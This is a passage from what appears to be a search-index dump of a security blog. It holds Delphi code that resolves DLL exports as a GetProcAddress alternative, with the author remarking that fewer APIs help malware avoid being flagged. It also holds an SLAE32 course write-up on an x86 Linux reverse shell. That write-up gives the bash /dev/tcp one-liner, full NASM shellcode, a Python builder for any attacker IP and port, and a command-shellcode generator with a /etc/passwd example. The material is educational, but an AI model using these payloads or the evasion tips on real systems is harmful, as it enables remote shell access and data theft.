AImageOptionalHeader64.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT] else AExportAddr := AImageOptionalHeader32.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; pOffset := Pointer(ALoadedModule + AExportAddr.VirtualAddress); if NOT Assigned(pOffset) then Exit; if NOT ReadProcessMemory(hProcess, pOffset, @AExportDir, SizeOf(TImageExportDirectory), dwBytesRead) then Exit(); if (AExportDir.NumberOfFunctions \u0026lt;= 0) then Exit; /// { Enumerate Named Exported Functions } for I := 0 to AExportDir.NumberOfNames - 1 do begin // Function Name pOffset := Pointer(ALoadedModule + (AExportDir.AddressOfNames + (I * SizeOf(Cardinal)))); if NOT ReadProcessMemory(hProcess, pOffset, @AOffset, SizeOf(Cardinal), dwBytesRead) then Exit(); pOffset := Pointer(AOffset); ALen := GetStringLength(pOffset); SetLength(AExportName, ALen); if NOT ReadProcessMemory(hProcess, pOffset, @AExportName[1], ALen, dwBytesRead) then Exit(); { Checking if we found requested function } if LowerCase(AExportName) \u0026lt;\u0026gt; AFuncName then continue; // Ordinal pOffset := Pointer(ALoadedModule + (AExportDir.AddressOfNameOrdinals) + (I * SizeOf(Word))); if NOT ReadProcessMemory(hProcess, pOffset, @AOrdinal, SizeOf(Word), dwBytesRead) then Exit(); // Function Address pOffset := Pointer(ALoadedModule + (AExportDir.AddressOfFunctions) + (AOrdinal * SizeOf(Cardinal))); if NOT ReadProcessMemory(hProcess, pOffset, @AFuncAddress, SizeOf(Cardinal), dwBytesRead) then Exit(); /// result := AFuncAddress; end; end; Bellow code doesn\u0026rsquo;t change (GetProcAddress_ALT)\nfunction GetProcAddress_ALT(hModule : HMODULE; lpProcName : LPCSTR) : Pointer; var AFuncAddress : Cardinal; begin result := nil; /// AFuncAddress := GetExportAddressFromMemory(hModule, lpProcName); if (AFuncAddress \u0026gt; 0) then result := Pointer(hModule + AFuncAddress); end; Finally, you can trigger your MessageBoxW :-)\n//... var hUser32 : THandle; _MessageBoxW : function(hWnd: HWND; lpText, lpCaption: LPCWSTR; uType: UINT): Integer; stdcall; //... begin hUser32 := LoadLibrary('user32.dll'); if (hUser32 = 0) then Exit(); try @_MessageBoxW := GetProcAddress_ALT(hUser32, 'MessageBoxW'); _MessageBoxW(0, 'Hello World', 'Hey', 0); finally FreeLibrary(hUser32); end; //... "});index.add({'id':22,'href':'/docs/windows/snippets/delphi/get-dll-exported-function-address/','title':"Get DLL Exported Function Address",'content':"This very small snippet is an adaptation of the previously released unit \u0026gt; UntEnumDLLExport.pas with just one goal, retrieve an exported function address by its name from any DLL (both 32 and 64bit).\nThis adaptation is also interesting because it remove the need of having both heavy units Generics.Collections and SysUtils to have a smaller binary.\nFinally it is also quite interesting for tweaking our GetProcAddress alternative (you will find here) and only have the necesarry code.\n// Jean-Pierre LESUEUR (@DarkCoderSc) //... uses Windows; //... function GetExportAddress(ADLLFile, AFuncName : String) : Cardinal; var hFile : THandle; dwBytesRead : Cardinal; AImageDosHeader : TImageDosHeader; AImageNtHeaderSignature : DWORD; x64Binary : Boolean; AImageFileHeader : TImageFileHeader; AImageOptionalHeader32 : TImageOptionalHeader32; AImageOptionalHeader64 : TImageOptionalHeader64; AExportAddr : TImageDataDirectory; AExportDir : TImageExportDirectory; I : Integer; ACanCatchSection : Boolean; AOffset : Cardinal; AExportName : AnsiString; ALen : Cardinal; AOrdinal : Word; AFuncAddress : Cardinal; function RVAToFileOffset(ARVA : Cardinal) : Cardinal; var I : Integer; AImageSectionHeader : TImageSectionHeader; ASectionsOffset : Cardinal; begin result := 0; /// if (ARVA = 0) or (NOT ACanCatchSection) then Exit(); /// ASectionsOffset := ( AImageDosHeader._lfanew + SizeOf(DWORD) + SizeOf(TImageFileHeader) + AImageFileHeader.SizeOfOptionalHeader ); for I := 0 to (AImageFileHeader.NumberOfSections -1) do begin SetFilePointer(hFile, ASectionsOffset + (I * SizeOf(TImageSectionHeader)), nil, FILE_BEGIN); if NOT ReadFile(hFile, AImageSectionHeader, SizeOf(TImageSectionHeader), dwBytesRead, 0) then continue; if (ARVA \u0026gt;= AImageSectionHeader.VirtualAddress) and (ARVA \u0026lt; AImageSectionHeader.VirtualAddress + AImageSectionHeader.SizeOfRawData) then result := (ARVA - AImageSectionHeader.VirtualAddress + AImageSectionHeader.PointerToRawData); end; end; function GetStringLength(AStartAtPos : Cardinal) : Cardinal; var ADummy : Byte; begin result := 0; /// if (hFile = INVALID_HANDLE_VALUE) then Exit(); SetFilePointer(hFile, AStartAtPos, nil, FILE_BEGIN); while True do begin if NOT ReadFile(hFile, ADummy, SizeOf(Byte), dwBytesRead, nil) then break; /// if (ADummy = 0) then break; Inc(result); end; end; // Ripped from SysUtils.pas function LowerCase(const S: string): string; var I, Len: Integer; DstP, SrcP: PChar; Ch: Char; begin Len := Length(S); SetLength(Result, Len); if Len \u0026gt; 0 then begin DstP := PChar(Pointer(Result)); SrcP := PChar(Pointer(S)); for I := Len downto 1 do begin Ch := SrcP^; case Ch of 'A'..'Z': Ch := Char(Word(Ch) or $0020); end; DstP^ := Ch; Inc(DstP); Inc(SrcP); end; end; end; begin result := 0; /// ACanCatchSection := False; AFuncName := LowerCase(AFuncName); hFile := CreateFileW(PWideChar(ADLLFile), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0); if hFile = INVALID_HANDLE_VALUE then Exit; /// try if NOT ReadFile(hFile, AImageDosHeader, SizeOf(TImageDosHeader), dwBytesRead, 0) then Exit; /// if (AImageDosHeader.e_magic \u0026lt;\u0026gt; IMAGE_DOS_SIGNATURE) then Exit; /// SetFilePointer(hFile, AImageDosHeader._lfanew, nil, FILE_BEGIN); if NOT ReadFile(hFile, AImageNtHeaderSignature, SizeOf(DWORD), dwBytesRead, 0) then Exit; /// if (AImageNTHeaderSignature \u0026lt;\u0026gt; IMAGE_NT_SIGNATURE) then Exit; /// SetFilePointer(hFile, (AImageDosHeader._lfanew + sizeOf(DWORD)), nil, FILE_BEGIN); if NOT ReadFile(hFile, AImageFileHeader, SizeOf(TImageFileHeader), dwBytesRead, 0) then Exit; /// ACanCatchSection := True; x64Binary := (AImageFileHeader.Machine = IMAGE_FILE_MACHINE_AMD64); if x64Binary then begin if NOT ReadFile(hFile, AImageOptionalHeader64, AImageFileHeader.SizeOfOptionalHeader, dwBytesRead, 0) then Exit; end else begin if NOT ReadFile(hFile, AImageOptionalHeader32, AImageFileHeader.SizeOfOptionalHeader, dwBytesRead, 0) then Exit; end; /// AExportAddr.VirtualAddress := 0; AExportAddr.Size := 0; if x64Binary then AExportAddr := AImageOptionalHeader64.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT] else AExportAddr := AImageOptionalHeader32.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; AOffset := RVAToFileOffset(AExportAddr.VirtualAddress); if AOffset = 0 then Exit; SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AExportDir, SizeOf(TImageExportDirectory), dwBytesRead, 0) then Exit; /// if (AExportDir.NumberOfFunctions \u0026lt;= 0) then Exit; /// { Enumerate Named Exported Functions } for I := 0 to AExportDir.NumberOfNames - 1 do begin // Function Name AOffset := RVAToFileOffset(AExportDir.AddressOfNames) + (I * SizeOf(Cardinal)); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AOffset, SizeOf(Cardinal), dwBytesRead, 0) then continue; /// ALen := GetStringLength(RVAToFileOffset(AOffset)); SetLength(AExportName, ALen); SetFilePointer(hFile, RVAToFileOffset(AOffset), nil, FILE_BEGIN); if NOT ReadFile(hFile, AExportName[1], ALen, dwBytesRead, nil) then continue; { Checking if we found requested function } if LowerCase(AExportName) \u0026lt;\u0026gt; AFuncName then continue; // Ordinal AOffset := RVAToFileOffset(AExportDir.AddressOfNameOrdinals) + (I * SizeOf(Word)); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AOrdinal, SizeOf(Word), dwBytesRead, 0) then continue; /// // Function Address AOffset := RVAToFileOffset(AExportDir.AddressOfFunctions) + (AOrdinal * SizeOf(Cardinal)); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AFuncAddress, SizeOf(Cardinal), dwBytesRead, 0) then continue; /// result := AFuncAddress; end; finally CloseHandle(hFile); end; end; GetProcAddress Alternative (Without UntEnumDLLExport.pas) function GetProcAddress_ALT(hModule : HMODULE; lpProcName : LPCSTR) : Pointer; var AFuncAddress : Cardinal; begin result := nil; /// AFuncAddress := GetExportAddress(GetModuleImagePath(hModule), lpProcName); if (AFuncAddress \u0026gt; 0) then result := Pointer(hModule + AFuncAddress); end; /!\\ You will find the code of GetModuleImagePath function Here\nWhat about the future ? I will adapat the function GetExportAddress() to catch export table directly from process memory instead of reading file on disk.\nThis will remove the need of enumerating module to catch target module instance filename (function GetModuleImagePath).\nLess dependencies and API\u0026rsquo;s you use and less likely your piece of code will get flagged. Especially while creating Malware while conducting red team exercice :-)\n"});index.add({'id':23,'href':'/docs/linux/slae32/ex2-reverseshell/','title':"Assignment N°2 - Reverse Shell (NASM)",'content':"Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.\nIf you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.\nWhy? the goal of that certification is to practice and learn how to solve each assignment by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.\nStudent ID: SLAE-1530\n   Create a TCP Reverse Shellcode for Linux x86-32.\n  The port number should be easily configurable.\n  The IP address should be easily configurable.\n  Bonus if getting referenced in exploit-db or shell-storm.\n  TCP Reverse Shell Principle In first exercise we learnt how to create our own TCP Bindshell shellcode using few syscalls (socketcall(), dup2() and execve()).\nA reverse shell is almost identical to a classic bindshell, this time instead of having a shellcode that listen for new clients, we will create a shellcode that will connect back to a remote server.\nFortunately, on Linux by default, we do not have any restrictions to manage sockets in client mode.\nI invite you to read the first paper before this one. Many things are similar between the two shellcodes and we will only point main differences.  On Linux (in bellow example Ubuntu 18.04), it is easy to create a simple reverse shell connection only using a single command.\nFirst open the listener (in this case, the attacker\u0026rsquo;s machine):\nroot@local:# nc -lvp 443\nAnd then, bellow command will establish a new connection to attacker\u0026rsquo;s machine and redirect stdin(0), stdout(1) and stderr(2) file descriptors.\nuser@local:$ /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/127.0.0.1/443 0\u0026gt;\u0026amp;1\nWe could also use Netcat 🐱 with mknod command like in previous paper example.  Process In real life, we will most of the time face reverse shell shellcodes using one of the two first methods brievly introduced bellow.\nSince the two first methods are very similar to our first paper, we decided to think out of the box and use a completely different approach.\nIndeed, we will spawn a new reverse shell only running a specially crafted command with execve() syscall.\nMethod 1 and Method 2 chapter will only briefly introduce required steps for creating a reverse shell using different syscalls.\nMethod 3 is the subject of our paper and will describe the whole process in detail.\nMethod 1 - Classic Required Syscalls Below table is ordered by syscall execution order.\n   Decimal N° Hex N° Name     359 0x167 socket()   362 0x16a connect()   63 0x3f dup2()   11 0xb execve()    This technique is what we would use if we were coding a classic client program using higher language (C/C++, Pascal etc..).\nSteps  Create a new IPv4/TCP socket using socket(). Establish a new connection to a listening socket defined by its IP address and Port number using connect(). Duplicate stdin(0), stdout(1) and stderr(2) file descriptors with client socket using dup2(). Finally, spawn a new shell using execve() with /bin/sh or any shell you want.  Method 2 - socketcall() Below table is ordered by syscall execution order.\n   Decimal N° Hex N° Name     102 0x66 socketcall()   63 0x3f dup2()   11 0xb execve()    On x86-32 architecture, this technique will remove both socket() and connect() syscalls.\nSteps are the same as for method 1, however socketcall() function differently, see previous paper for more detail.\nSteps  Create a new IPv4/TCP socket using socketcall() and call number SYS_SOCKET(1) Establish a new connection to a listening socket defined by its IP address and Port number using socketcall() and call number SYS_CONNECT(2). Duplicate stdin(0), stdout(1) and stderr(2) file descriptors with client socket using dup2(). Finally, spawn a new shell using execve() with /bin/sh or any shell you want.  Method 3 - Run Command Why would we bother manipulating sockets if everything we need is already natively available through command line? We don\u0026rsquo;t have to!\nAdvanced execve()usage schema It requires four registers: eax, ebx, ecx and edx\n eax register value needs to be set to 0xb representing the syscall number for execve(). ebx register must be set with an address pointing to the program name (/bin/bash). ecx register must contains and address pointing to a NULL terminated array of addresses pointing to arguments to pass to the program. edx register can contain additional environment settings, we won\u0026rsquo;t use that register so it will point to an address containing NULL.  Assembly Code Creation Plan Part I - Testing and understanding this technique using high level language (C) It is a good habit to create things in a higher level language before coding in assembly.\nSo let\u0026rsquo;s quickly script something in C.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main(void) { char* args[] = { \u0026quot;/bin/bash\u0026quot;, \u0026quot;-c\u0026quot;, // run a new command (could be /bin/sh to save few bytes) \u0026quot;//*/bash -i \u0026gt;\u0026amp; /dev/tcp/127.0.0.1/443 0\u0026gt;\u0026amp;1\u0026quot;, // reverse shell command NULL // NULL byte telling we reached the last argument }; execve(args[0], \u0026amp;args[0], NULL); return 0; } user@local:$ gcc poc.c -o poc\nNow we open a new listener:\nroot@local:# nc -lvp 443\nand run in another terminal the PoC:\nuser@local:$ ./poc\nSuccess, we have a shell!\nroot@ubuntu:/home/phrozen/SLAE32/SLAE-Exam/Level2# nc -lvp 443 Listening on [0.0.0.0] (family 0, port 443) Connection from localhost 56256 received! To run a command as administrator (user \u0026quot;root\u0026quot;), use \u0026quot;sudo \u0026lt;command\u0026gt;\u0026quot;. See \u0026quot;man sudo_root\u0026quot; for details. phrozen@ubuntu:/home/phrozen/SLAE32/SLAE-Exam/Level2$ Part II - Apply above principle to NASM 1 - Push *pathname Remember, ebx register must contain an address pointing to a NULL terminated string. This string represent the program we want to run : /bin/bash\nWe could also use another shell (ex: /bin/sh), this would save 4 bytes to our final shellcode.  Since we are facing a Little Endian architecture, the pushed string must be stored in reverse order.\nTo prevent extra instructions we also need to take care of alignment. x86-32 address are 4 bytes long so string length must be a multiple of 4.\nSince /bin/bash is 9 bytes long, we must add 3 extra / =\u0026gt; : ////bin/bash to fit alignment.\nExample Stack Dump    Address Content     000000058 0x2f2f2f2f (////)   00000005c 0x2f6e6962 (/nib)   000000060 0x68736162 (hsab)   000000064 0x00000000 (NULL)    Following above stack dump ebx register would be set to 0x00000058\n 2 - Push *argv[] This part is the most tricky part so far, ecx register needs to point to a NULL terminated array of addresses. Each address need to point to a NULL terminated string address with the argument value.\nWe still need to take care of alignment and Endianness.\nWe will push three different arguments.\nArgv[0] The first argument by convention contains the pathname (/bin/bash). The second argument contains -c which tells bash program we want to run a command line. Finally third argument contains our reverse shell payload string: /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/127.0.0.1/443 0\u0026gt;\u0026amp;1\nNotice to save some precious bytes, we can compress the payload string as follows: /*/bash -i\u0026gt;\u0026amp;/dev/tcp/2130706433/443 0\u0026gt;\u0026amp;1\n /*/bash is a wildcard that will search for any subdirectories containing bash program. 2130706433 is the equivalent of 127.0.0.1 but in \u0026ldquo;integer\u0026rdquo; format.  Example Stack Dump    Address Content     000000014 addr(0x000000004) (Argv[0] = ebx)   000000018 addr(0x000000040) (Argv[1])   00000001c addr(0x000000014) (Argv[2])   000000020 0x000000000 (NULL)   000000024 0x622f2a2f (1\u0026amp;\u0026gt;0)   000000028 0x20687361 (344)   00000002c 0x263e692d (/334)   000000030 0x7665642f (6070)   000000034 0x7063742f (312/)   000000038 0x3331322f (pct/)   00000003c 0x36303730 (ved/)   000000040 0x2f333334 (\u0026amp;\u0026gt;i-)   000000044 0x20333434 ( hsa)   000000048 0x31263e30 (b/*/)   00000004c 0x00000000 (NULL)   000000050 0x632d (c-)   000000054 0x00000000 (NULL)    Following above stack dump ecx register would be set to 0x000000014\n 3 - Push *envp[] Lastly we need to set the edx register to an address that points to NULL.\nThe easiest way is to simply push a new NULL to the top of the stack then assign top address of the stack (esp) to edx.\n   Address Content     000000010 0x00000000 (NULL)    Following above stack dump edx register would be set to 0x00000010\n4 - Call execve() We can finally set eax to 0xb to call the execve() syscall.\n*Debugging* on success execve() does not return.   TCP Reverse Shell Code (NASM) ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; Filename : bindshell.nasm ; ; Author : Jean-Pierre LESUEUR ; ; Website : https://www.phrozen.io/ ; ; Email : jplesueur@phrozen.io ; ; Twitter : @DarkCoderSc ; ; ; ; --------------------------------------------------; ; SLAE32 Certification Exercise N°2 ; ; (Pentester Academy). ; ; https://www.pentesteracademy.com ; ; --------------------------------------------------; ; ; ; Purpose: ; ; --------------------------------------------------; ; Reverse Shell ; ; Connects to 127.0.0.1:443 by default ; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; global _start section .text _start: xor eax, eax\t;-------------------------------------------------------------------- ; *pathname ;-------------------------------------------------------------------- ; ///bin//bash push eax push 0x68736162 ; hsab push 0x2f2f6e69 ; //ni push 0x622f2f2f ; b/// mov ebx, esp ;-------------------------------------------------------------------- ; *argv[] ;--------------------------------------------------------------------\t; -c mov ax, 0x632d push eax xor eax, eax mov edx, esp ; /*/bash -i\u0026gt;\u0026amp;/dev/tcp/2130706433/443 0\u0026gt;\u0026amp;1 push eax push 0x31263e30 ; 1\u0026amp;\u0026gt;0 push 0x20333434 ; 344 push 0x2f333334 ; /334 push 0x36303730 ; 6070 push 0x3331322f ; 312/ push 0x7063742f ; pct/ push 0x7665642f ; ved/ push 0x263e692d ; \u0026amp;\u0026gt;i- push 0x20687361 ; hsa push 0x622f2a2f ; b/*/\tmov esi, esp push eax ; EOF Arguments push esi ; Argv[2] = \u0026quot;/bin//bash -i \u0026gt;\u0026amp; /dev/tcp/127.0.0.1/443 0\u0026gt;\u0026amp;1\u0026quot; push edx ; Argv[1] = \u0026quot;-c\u0026quot; push ebx ; Argv[0] = \u0026quot;/bin/bash\u0026quot; mov ecx, esp ;-------------------------------------------------------------------- ; *envp[] - We don't care (NULL) ;--------------------------------------------------------------------\tpush eax mov edx, esp ;-------------------------------------------------------------------- ; execve() syscall ;--------------------------------------------------------------------\tmov al, 0xb int 0x80 Compile and Test our Payload user@local:$ nasm -f elf32 -o revshell.o revshell.nasm\nuser@local:$ ld -o revshell revshell.o\nNow we open a new listener:\nroot@local:# nc -lvp 443\nand run in another terminal the PoC:\nuser@local:$ ./revshell\nSuccess, we have a shell!\nShellcode Builder (Python3) The last required objective for this exercise is to create a builder to easily patch the final shellcode with desired IP address and TCP port number.\nThis objective requires more work than for TCP bindshell but is by far more straightforward.\nWe only need to patch one string in our final payload (highlighted in bellow screen).\nTo do so we must especially take care of two things:\nN°1 Each chunks (stack pushes) of our final string payload must be aligned to 4 bytes and reversed.  N°2 We will translate IP Address in its integer equivalent (network byte order) using inet_aton from socket library. This will minimize final shellcode length.   Builder Code (Python3) #!/usr/bin/python3 ''' Jean-Pierre LESUEUR @DarkCoderSc jplesueur@phrozen.io https://www.phrozen.io *** SLAE32 Certification Exercise N°2 (Pentester Academy). https://www.pentesteracademy.com *** Description: Generate a TCP Reverse Shell with desired IP Address and TCP Port number. ''' import socket import sys import struct from textwrap import wrap def fail(message): print(\u0026quot;[\\033[31mKO\\033[39m] \u0026quot; + message) def success(message): print(\u0026quot;[\\033[32mOK\\033[39m] \u0026quot; + message) try: if len(sys.argv) != 3: print(\u0026quot;Usage: ./gen_revshell.py \u0026lt;LHOST\u0026gt; \u0026lt;LPORT\u0026gt;\u0026quot;) raise else: LHOST = sys.argv[1] try:\tsocket.inet_aton(LHOST) except: fail(\u0026quot;Invalid IP address (ex:127.0.0.1)\u0026quot;) raise try: LPORT = int(sys.argv[2]) if (LPORT \u0026gt; 65535) or (LPORT \u0026lt; 0): raise except: fail(\u0026quot;Invalid port number (0..65535)\u0026quot;) raise except: sys.exit()\trevstr = \u0026quot;/*/bash -i\u0026gt;\u0026amp;/dev/tcp/{}/{} 0\u0026gt;\u0026amp;1\u0026quot; payload = \u0026quot;\u0026quot; payload += \u0026quot;\\\\x31\\\\xc0\u0026quot; # xor eax, eax payload += \u0026quot;\\\\x50\u0026quot; # push eax payload += \u0026quot;\\\\x68\\\\x62\\\\x61\\\\x73\\\\x68\u0026quot; # push 0x68736162 payload += \u0026quot;\\\\x68\\\\x69\\\\x6e\\\\x2f\\\\x2f\u0026quot; # push 0x2f2f6e69 payload += \u0026quot;\\\\x68\\\\x2f\\\\x2f\\\\x2f\\\\x62\u0026quot; # push 0x622f2f2f payload += \u0026quot;\\\\x89\\\\xe3\u0026quot; # mov ebx,esp payload += \u0026quot;\\\\x66\\\\xb8\\\\x2d\\\\x63\u0026quot; # mov ax,0x632d payload += \u0026quot;\\\\x50\u0026quot; # push eax payload += \u0026quot;\\\\x31\\\\xc0\u0026quot; # xor eax,eax payload += \u0026quot;\\\\x89\\\\xe2\u0026quot; # mov edx,esp payload += \u0026quot;\\\\x50\u0026quot; # push eax ######################################### ''' Align command following chosen options ''' LHOST = struct.unpack(\u0026quot;!I\u0026quot;, socket.inet_aton(LHOST))[0] revstr = revstr.format(LHOST, LPORT) pad = 4 - (len(revstr) % 4) if (pad \u0026lt; 4): revstr = (\u0026quot;/\u0026quot;*pad) + revstr ''' Write our reverse shell command (Aligned) ''' for i in reversed(range(0, len(revstr), 4)): opcode = \u0026quot;\\\\x68\u0026quot; for n in range(4): opcode += \u0026quot;\\\\x\u0026quot; + revstr[i:(i+4)][n:(n+1)].encode('ascii').hex() payload += opcode ######################################### payload += \u0026quot;\\\\x89\\\\xe6\u0026quot; # mov esi,esp payload += \u0026quot;\\\\x50\u0026quot; # push eax payload += \u0026quot;\\\\x56\u0026quot; # push esi payload += \u0026quot;\\\\x52\u0026quot; # push edx payload += \u0026quot;\\\\x53\u0026quot; # push ebx payload += \u0026quot;\\\\x89\\\\xe1\u0026quot; # mov ecx,esp payload += \u0026quot;\\\\x50\u0026quot; # push eax payload += \u0026quot;\\\\x89\\\\xe2\u0026quot; # mov edx,esp payload += \u0026quot;\\\\xb0\\\\x0b\u0026quot; # mov al,0xb payload += \u0026quot;\\\\xcd\\\\x80\u0026quot; # int 0x80 size = int(len(payload) / 4) success(\u0026quot;Shellcode successfully generated size={} Bytes.\u0026quot;.format(size)) final_payload = \u0026quot;// Shellcode size = {}\\n\u0026quot;.format(size) final_payload += \u0026quot;unsigned char code[] = \\\\\\n\u0026quot; for l in wrap(payload, 64): final_payload += \u0026quot;\\t\\\u0026quot;{}\\\u0026quot;\\n\u0026quot;.format(l) final_payload = final_payload[:-1] + \u0026quot;;\u0026quot; print(final_payload) Usage user@local:$ python3 ./gen_revshell.py 172.16.20.145 1403\nor\nuser@local:$ chmod +x gen_revshell.py \u0026amp;\u0026amp; ./gen_revshell.py 172.16.20.145 1403\nReplace IP address with yours, 172.16.20.145 was my Ubuntu VM actual local IP address.  Never execute shellcodes from unknown sources without understanding what they really do. (Ndisasm and GDB are your best friend)  // Shellcode size = 100 unsigned char code[] = \\ \u0026quot;\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x69\\x6e\\x2f\\x2f\\x68\\x2f\\x2f\u0026quot; \u0026quot;\\x2f\\x62\\x89\\xe3\\x66\\xb8\\x2d\\x63\\x50\\x31\\xc0\\x89\\xe2\\x50\\x68\\x30\u0026quot; \u0026quot;\\x3e\\x26\\x31\\x68\\x34\\x30\\x33\\x20\\x68\\x39\\x33\\x2f\\x31\\x68\\x37\\x33\u0026quot; \u0026quot;\\x34\\x39\\x68\\x32\\x38\\x38\\x36\\x68\\x74\\x63\\x70\\x2f\\x68\\x64\\x65\\x76\u0026quot; \u0026quot;\\x2f\\x68\\x69\\x3e\\x26\\x2f\\x68\\x73\\x68\\x20\\x2d\\x68\\x2a\\x2f\\x62\\x61\u0026quot; \u0026quot;\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe6\\x50\\x56\\x52\\x53\\x89\\xe1\\x50\\x89\\xe2\u0026quot; \u0026quot;\\xb0\\x0b\\xcd\\x80\u0026quot;; We can place above raw shellcode in our C template.\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; // Shellcode size = 100 unsigned char code[] = \\ \u0026quot;\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x69\\x6e\\x2f\\x2f\\x68\\x2f\\x2f\u0026quot; \u0026quot;\\x2f\\x62\\x89\\xe3\\x66\\xb8\\x2d\\x63\\x50\\x31\\xc0\\x89\\xe2\\x50\\x68\\x30\u0026quot; \u0026quot;\\x3e\\x26\\x31\\x68\\x34\\x30\\x33\\x20\\x68\\x39\\x33\\x2f\\x31\\x68\\x37\\x33\u0026quot; \u0026quot;\\x34\\x39\\x68\\x32\\x38\\x38\\x36\\x68\\x74\\x63\\x70\\x2f\\x68\\x64\\x65\\x76\u0026quot; \u0026quot;\\x2f\\x68\\x69\\x3e\\x26\\x2f\\x68\\x73\\x68\\x20\\x2d\\x68\\x2a\\x2f\\x62\\x61\u0026quot; \u0026quot;\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe6\\x50\\x56\\x52\\x53\\x89\\xe1\\x50\\x89\\xe2\u0026quot; \u0026quot;\\xb0\\x0b\\xcd\\x80\u0026quot;; main() { printf(\u0026quot;Shellcode Length: %d\\n\u0026quot;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } user@local:$ gcc shellcode.c -o shellcode -z execstack\nNow we open a new listener:\nroot@local:# nc -lvp 443\nand run in another terminal the PoC:\nuser@local:$ ./shellcode\nAnd enjoy!\nConclusion TCP Bindshell and Reverse Shell principles are quite similar if you except to do it using the standard way (through socket programming).\nSince doing repetitive things is boring, we studied a good alternative only using the execve() syscall.\nWe could modify few things in our python shellcode generator and create a variant to generate this time shellcodes to run any commands.\nBy chance, we did it!\nBonus - Command Shellcode Generator (Python3) #!/usr/bin/python3 ''' Jean-Pierre LESUEUR @DarkCoderSc jplesueur@phrozen.io https://www.phrozen.io ''' import sys from textwrap import wrap def fail(message): print(\u0026quot;[\\033[31mKO\\033[39m] \u0026quot; + message) def success(message): print(\u0026quot;[\\033[32mOK\\033[39m] \u0026quot; + message) if len(sys.argv) != 2: print(\u0026quot;Usage: ./gen_cmd_shellcode.py \u0026lt;command\u0026gt;\u0026quot;) sys.exit() command = sys.argv[1] payload = \u0026quot;\u0026quot; payload += \u0026quot;\\\\x31\\\\xc0\u0026quot; # xor eax, eax payload += \u0026quot;\\\\x50\u0026quot; # push eax payload += \u0026quot;\\\\x68\\\\x62\\\\x61\\\\x73\\\\x68\u0026quot; # push 0x68736162 payload += \u0026quot;\\\\x68\\\\x69\\\\x6e\\\\x2f\\\\x2f\u0026quot; # push 0x2f2f6e69 payload += \u0026quot;\\\\x68\\\\x2f\\\\x2f\\\\x2f\\\\x62\u0026quot; # push 0x622f2f2f payload += \u0026quot;\\\\x89\\\\xe3\u0026quot; # mov ebx,esp payload += \u0026quot;\\\\x66\\\\xb8\\\\x2d\\\\x63\u0026quot; # mov ax,0x632d payload += \u0026quot;\\\\x50\u0026quot; # push eax payload += \u0026quot;\\\\x31\\\\xc0\u0026quot; # xor eax,eax payload += \u0026quot;\\\\x89\\\\xe2\u0026quot; # mov edx,esp payload += \u0026quot;\\\\x50\u0026quot; # push eax ######################################### ''' Align command following chosen options ''' pad = 4 - (len(command) % 4) if (pad \u0026lt; 4): command = (\u0026quot;/\u0026quot;*pad) + command ''' Write our reverse shell command (Aligned) ''' for i in reversed(range(0, len(command), 4)): opcode = \u0026quot;\\\\x68\u0026quot; for n in range(4): opcode += \u0026quot;\\\\x\u0026quot; + command[i:(i+4)][n:(n+1)].encode('ascii').hex() payload += opcode ######################################### payload += \u0026quot;\\\\x89\\\\xe6\u0026quot; # mov esi,esp payload += \u0026quot;\\\\x50\u0026quot; # push eax payload += \u0026quot;\\\\x56\u0026quot; # push esi payload += \u0026quot;\\\\x52\u0026quot; # push edx payload += \u0026quot;\\\\x53\u0026quot; # push ebx payload += \u0026quot;\\\\x89\\\\xe1\u0026quot; # mov ecx,esp payload += \u0026quot;\\\\x50\u0026quot; # push eax payload += \u0026quot;\\\\x89\\\\xe2\u0026quot; # mov edx,esp payload += \u0026quot;\\\\xb0\\\\x0b\u0026quot; # mov al,0xb payload += \u0026quot;\\\\xcd\\\\x80\u0026quot; # int 0x80 size = int(len(payload) / 4) success(\u0026quot;Shellcode successfully generated, size={} Bytes.\u0026quot;.format(size)) final_payload = \u0026quot;// Shellcode size = {}\\n\u0026quot;.format(size) final_payload += \u0026quot;unsigned char code[] = \\\\\\n\u0026quot; for l in wrap(payload, 64): final_payload += \u0026quot;\\t\\\u0026quot;{}\\\u0026quot;\\n\u0026quot;.format(l) final_payload = final_payload[:-1] + \u0026quot;;\u0026quot; print(final_payload) Few examples user@local:$ ./gen_cmd_shellcode.py \u0026quot;/bin/cat /etc/passwd\u0026quot;\n// Shellcode size = 70 unsigned char code[] = \\ \u0026quot;\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x69\\x6e\\x2f\\x2f\\x68\\x2f\\x2f\u0026quot; \u0026quot;\\x2f\\x62\\x89\\xe3\\x66\\xb8\\x2d\\x63\\x50\\x31\\xc0\\x89\\xe2\\x50\\x68\\x73\u0026quot; \u0026quot;\\x73\\x77\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x20\\x2f\\x65\\x74\\x68\\x2f\\x63\u0026quot; \u0026quot;\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe6\\x50\\x56\\x52\\x53\\x89\\xe1\\x50\u0026quot; 